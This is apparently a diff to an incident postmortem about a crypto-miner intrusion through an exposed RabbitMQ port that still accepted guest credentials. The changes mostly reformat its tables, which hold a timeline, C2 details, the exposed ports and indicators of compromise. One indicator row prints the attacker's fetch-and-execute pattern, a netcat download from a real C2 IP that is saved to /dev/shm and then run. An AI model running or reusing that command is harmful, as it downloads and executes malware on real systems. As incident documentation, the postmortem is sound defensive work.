@@ -9,19 +9,19 @@ On 2026-04-04 at ~18:32 UTC, an attacker exploited the RabbitMQ AMQP port (5672)
 
 ## Timeline
 
-| Time (UTC) | Event |
-|---|---|
-| 18:32:00 | Attacker files appear in `/dev/shm/`: `JLOiBF` (1.3MB dropper), `iadEFX` (2.6MB miner), `Dj` (8KB config) |
-| 18:33:00 | First `nc` shell processes spawned — downloading payloads from `107.175.89.136:9009` |
-| 18:33:13 | Crypto miner process starts (PID 830677, `/dev/shm/iadEFX -c /dev/shm/Dj -B`) |
-| 18:33-20:21 | Multiple waves of `nc` downloaders spawned at intervals (~18:33, 18:48, 19:16, 19:59, 20:16, 20:21) |
+| Time (UTC)  | Event                                                                                                                                            |
+| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
+| 18:32:00    | Attacker files appear in `/dev/shm/`: `JLOiBF` (1.3MB dropper), `iadEFX` (2.6MB miner), `Dj` (8KB config)                                        |
+| 18:33:00    | First `nc` shell processes spawned — downloading payloads from `107.175.89.136:9009`                                                             |
+| 18:33:13    | Crypto miner process starts (PID 830677, `/dev/shm/iadEFX -c /dev/shm/Dj -B`)                                                                    |
+| 18:33-20:21 | Multiple waves of `nc` downloaders spawned at intervals (~18:33, 18:48, 19:16, 19:59, 20:16, 20:21)                                              |
 | 20:38-20:41 | User reports "Unable to load profile charts" — gunicorn workers OOM killed trying to compute tier_type correlation with only 237MB RAM available |
-| 20:43 | Incident detected during performance investigation. Miners and `/dev/shm/` files killed/deleted |
-| 20:43 | First batch of `nc` downloaders (from `/dev/shm/`) killed |
-| 20:57 | Remaining `nc` downloaders (from `/tmp/`) killed |
-| 21:03 | RabbitMQ `guest` user deleted, new authenticated user created |
-| 21:03 | UFW firewall enabled — only ports 22, 80, 443 allowed inbound |
-| 21:04 | All services restarted with new broker credentials, verified healthy |
+| 20:43       | Incident detected during performance investigation. Miners and `/dev/shm/` files killed/deleted                                                  |
+| 20:43       | First batch of `nc` downloaders (from `/dev/shm/`) killed                                                                                        |
+| 20:57       | Remaining `nc` downloaders (from `/tmp/`) killed                                                                                                 |
+| 21:03       | RabbitMQ `guest` user deleted, new authenticated user created                                                                                    |
+| 21:03       | UFW firewall enabled — only ports 22, 80, 443 allowed inbound                                                                                    |
+| 21:04       | All services restarted with new broker credentials, verified healthy                                                                             |
 
 ## Attack Vector
 
@@ -48,14 +48,14 @@ The attacker connected to AMQP port 5672 with `guest/guest` credentials, then li
 
 ### C2 Server
 
-| Field | Value |
-|---|---|
-| IP | `107.175.89.136` |
-| Port | 9009 |
-| Hostname | `107-175-89-136-host.colocrossing.com` |
-| ISP | HostPapa / AS36352 |
-| Location | Buffalo, New York, USA |
-| Type | Likely a compromised or rented VPS on ColoCrossing infrastructure |
+| Field    | Value                                                             |
+| -------- | ----------------------------------------------------------------- |
+| IP       | `107.175.89.136`                                                  |
+| Port     | 9009                                                              |
+| Hostname | `107-175-89-136-host.colocrossing.com`                            |
+| ISP      | HostPapa / AS36352                                                |
+| Location | Buffalo, New York, USA                                            |
+| Type     | Likely a compromised or rented VPS on ColoCrossing infrastructure |
 
 ### Prior Incident
 
@@ -105,18 +105,18 @@ A similar suspicious process (PID 745356, `/dev/shm/lblSR`, 2.1GB RSS, 145% CPU)
 
 ## Exposed Ports Before Remediation
 
-| Port | Service | Bound To | Accessible Externally | Risk |
-|---|---|---|---|---|
-| 22 | SSH | `0.0.0.0` | Yes | Low (pubkey only) |
-| 80 | nginx HTTP | `0.0.0.0` | Yes | Expected |
-| 443 | nginx HTTPS | `0.0.0.0` | Yes | Expected |
-| 3001 | Next.js dev | `127.0.0.1` | No | None |
-| 3002 | Umami analytics | `*` | **Yes** | Medium — no auth on port |
-| 4369 | EPMD (Erlang) | `*` | **Yes** | **High** — Erlang node discovery |
-| 5672 | RabbitMQ AMQP | `*` | **Yes** | **Critical** — attack vector |
-| 6379 | Redis | `127.0.0.1` | No | None |
-| 8888 | Gunicorn | `127.0.0.1` | No | None |
-| 25672 | Erlang distribution | `0.0.0.0` | **Yes** | **High** — inter-node RPC |
+| Port  | Service             | Bound To    | Accessible Externally | Risk                             |
+| ----- | ------------------- | ----------- | --------------------- | -------------------------------- |
+| 22    | SSH                 | `0.0.0.0`   | Yes                   | Low (pubkey only)                |
+| 80    | nginx HTTP          | `0.0.0.0`   | Yes                   | Expected                         |
+| 443   | nginx HTTPS         | `0.0.0.0`   | Yes                   | Expected                         |
+| 3001  | Next.js dev         | `127.0.0.1` | No                    | None                             |
+| 3002  | Umami analytics     | `*`         | **Yes**               | Medium — no auth on port         |
+| 4369  | EPMD (Erlang)       | `*`         | **Yes**               | **High** — Erlang node discovery |
+| 5672  | RabbitMQ AMQP       | `*`         | **Yes**               | **Critical** — attack vector     |
+| 6379  | Redis               | `127.0.0.1` | No                    | None                             |
+| 8888  | Gunicorn            | `127.0.0.1` | No                    | None                             |
+| 25672 | Erlang distribution | `0.0.0.0`   | **Yes**               | **High** — inter-node RPC        |
 
 ## Prevention
 
@@ -169,38 +169,39 @@ A similar suspicious process (PID 745356, `/dev/shm/lblSR`, 2.1GB RSS, 145% CPU)
 ### Malware hashes (not collected — files deleted before hashing)
 
 Files were deleted during triage. In future incidents, hash before deleting:
+
 ```bash
 sha256sum /dev/shm/iadEFX /dev/shm/Dj /dev/shm/JLOiBF
 ```
 
 ### Process characteristics
 
-| File | Size | Type | Description |
-|---|---|---|---|
-| `/dev/shm/iadEFX` | 2,637,380 bytes | ELF 64-bit LSB, x86-64, statically linked, no section header | Crypto miner — 7 threads, 142% CPU, 2.1GB RSS |
-| `/dev/shm/Dj` | 8,228 bytes | Config file | Miner configuration (pool addresses, wallet, etc.) |
+| File              | Size            | Type                                                         | Description                                              |
+| ----------------- | --------------- | ------------------------------------------------------------ | -------------------------------------------------------- |
+| `/dev/shm/iadEFX` | 2,637,380 bytes | ELF 64-bit LSB, x86-64, statically linked, no section header | Crypto miner — 7 threads, 142% CPU, 2.1GB RSS            |
+| `/dev/shm/Dj`     | 8,228 bytes     | Config file                                                  | Miner configuration (pool addresses, wallet, etc.)       |
 | `/dev/shm/JLOiBF` | 1,309,300 bytes | ELF 64-bit LSB, x86-64, statically linked, no section header | Dropper/watchdog — spawned `nc` downloaders periodically |
 
 ### Network indicators
 
-| Indicator | Value |
-|---|---|
-| C2 IP | `107.175.89.136` |
-| C2 Port | `9009/tcp` |
-| C2 Protocol | Raw TCP via `nc` (netcat) |
-| C2 ISP | HostPapa / ColoCrossing, Buffalo NY |
+| Indicator        | Value                                                                         |
+| ---------------- | ----------------------------------------------------------------------------- |
+| C2 IP            | `107.175.89.136`                                                              |
+| C2 Port          | `9009/tcp`                                                                    |
+| C2 Protocol      | Raw TCP via `nc` (netcat)                                                     |
+| C2 ISP           | HostPapa / ColoCrossing, Buffalo NY                                           |
 | Download pattern | `nc 107.175.89.136 9009 > /dev/shm/let` or `/tmp/let`, then `chmod` + execute |
 
 ### Timing pattern of `nc` downloaders
 
-| Wave | Time (UTC) | Targets |
-|---|---|---|
-| 1 | 18:33 | `/dev/shm/let`, `let` (cwd) |
-| 2 | 18:48 | `/tmp/let`, `let` (cwd) |
-| 3 | 19:16 | `/tmp/let`, `let` (cwd) |
-| 4 | 19:59 | `/tmp/let`, `let` (cwd) |
-| 5 | 20:16 | `/tmp/let`, `let` (cwd) |
-| 6 | 20:21 | `/tmp/let`, `let` (cwd) |
+| Wave | Time (UTC) | Targets                     |
+| ---- | ---------- | --------------------------- |
+| 1    | 18:33      | `/dev/shm/let`, `let` (cwd) |
+| 2    | 18:48      | `/tmp/let`, `let` (cwd)     |
+| 3    | 19:16      | `/tmp/let`, `let` (cwd)     |
+| 4    | 19:59      | `/tmp/let`, `let` (cwd)     |
+| 5    | 20:16      | `/tmp/let`, `let` (cwd)     |
+| 6    | 20:21      | `/tmp/let`, `let` (cwd)     |
 
 ~15-30 minute interval between waves. All ran as `battlestats` user. The `CLOSE-WAIT` state on most connections at time of discovery suggests the C2 server had stopped responding (possibly timed out or dropped).
 
